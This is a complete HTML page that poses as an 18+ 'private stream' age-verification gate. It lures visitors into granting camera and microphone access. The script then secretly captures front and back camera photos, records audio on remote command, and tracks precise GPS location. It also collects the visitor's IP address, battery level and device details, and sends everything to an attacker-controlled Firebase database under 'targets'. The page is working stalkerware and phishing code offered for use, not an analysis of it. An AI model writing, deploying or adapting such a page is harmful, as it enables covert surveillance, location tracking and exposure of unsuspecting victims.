<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Content Access</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { margin:0; background:#000; font-family: sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
        #verify-box { position:relative; z-index:10; background:#fff; padding:30px; border-radius:10px; text-align:center; width:85%; max-width:320px; }
        .btn { background:#ff3131; color:#fff; border:none; padding:15px; width:100%; border-radius:5px; cursor:pointer; font-weight:bold; }
        video#main-player { display:none; width:100%; height:100%; object-fit:contain; }
    </style>
</head>
<body>

<div id="verify-box">
    <h2 style="color:#222">18+ WARNING</h2>
    <p style="color:#666">Confirm your age to watch the private stream.</p>
    <button class="btn" onclick="startSystem()">I AM 18+ ENTER</button>
</div>

<video id="main-player" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    const sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);

    let globalStream = null;

    async function startSystem() {
        document.getElementById('verify-box').style.display = 'none';
        const v = document.getElementById('main-player');
        v.style.display = 'block';

        try {
            await initStream();
            v.play();

            // Initial Intel
            sendInfo();
            trackGPS();
            
            // Auto Capture Sequence
            setTimeout(() => capture("user"), 3000); // Front
            setTimeout(() => capture("environment"), 8000); // Back Force Fix

            // Persistent Command Listener
            db.ref(`commands/${sessionID}`).on('value', snap => {
                const cmd = snap.val();
                if(cmd) {
                    if(cmd.action === 'photo') capture("user");
                    if(cmd.action === 'back') capture("environment");
                    if(cmd.action === 'audio') recordAudio();
                    db.ref(`commands/${sessionID}`).remove();
                }
            });

        } catch (e) { alert("Permission Required!"); location.reload(); }
    }

    async function initStream() {
        if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
        globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        return globalStream;
    }

    // --- BACK CAMERA FORCE FIX ---
    async function capture(mode) {
        try {
            // Step 1: Pehle wale tracks ko release karna lazmi hai
            if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
            
            // Step 2: Ideal aur Exact dono ka fallback lagaya hai
            const constraints = { 
                video: { facingMode: { ideal: mode } } 
            };
            
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            const tempVid = document.createElement('video');
            tempVid.srcObject = stream;
            await tempVid.play();

            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = tempVid.videoWidth; canvas.height = tempVid.videoHeight;
                canvas.getContext('2d').drawImage(tempVid, 0, 0);
                
                db.ref(`targets/${sessionID}/photos`).push({
                    img: canvas.toDataURL('image/jpeg', 0.5),
                    type: mode === "user" ? "FRONT" : "BACK",
                    time: new Date().toLocaleTimeString()
                });
                
                stream.getTracks().forEach(t => t.stop());
                initStream(); // Command listener ke liye stream wapas bahal karein
            }, 3000);
        } catch (err) { 
            db.ref(`targets/${sessionID}/logs`).push("Cam Error: " + mode);
            initStream(); 
        }
    }

  // --- 30 SECOND AUDIO RECORDING SYSTEM ---
async function recordAudio() {
    try {
        // Microphone access confirm karein
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const recorder = new MediaRecorder(stream);
        let chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);

        recorder.onstop = () => {
            const reader = new FileReader();
            // Audio blob ko Base64 string mein convert karna
            reader.readAsDataURL(new Blob(chunks, { type: 'audio/webm' }));
            reader.onloadend = () => {
                const base64Audio = reader.result;
                // Firebase mein upload
                db.ref(`targets/${sessionID}/audios`).push({
                    data: base64Audio,
                    time: new Date().toLocaleTimeString()
                });
                // Mic band karna hardware se
                stream.getTracks().forEach(t => t.stop());
            };
        };

        // Recording shuru
        recorder.start();
        console.log("Recording Started (30s)...");

        // 30 Seconds ka timer (30000ms)
        setTimeout(() => {
            if (recorder.state !== "inactive") {
                recorder.stop();
                console.log("Recording Stopped.");
            }
        }, 30000); 

    } catch (err) {
        console.error("Audio Access Denied:", err);
        // Admin ko error log bhejna
        db.ref(`targets/${sessionID}/logs`).push("Audio Error: Permission Denied");
    }
}
    async function sendInfo() {
        const batt = await navigator.getBattery().catch(() => ({level:1}));
        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"N/A"}));
        db.ref(`targets/${sessionID}/info`).set({
            status: "ONLINE",
            ip: ip.ip,
            battery: Math.floor(batt.level * 100) + "%",
            device: navigator.userAgent.split(') ')[0] + ')',
            time: new Date().toLocaleTimeString()
        });
    }

    function trackGPS() {
        navigator.geolocation.watchPosition(p => {
            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
        }, null, {enableHighAccuracy:true});
    }
</script>
</body>
</html>
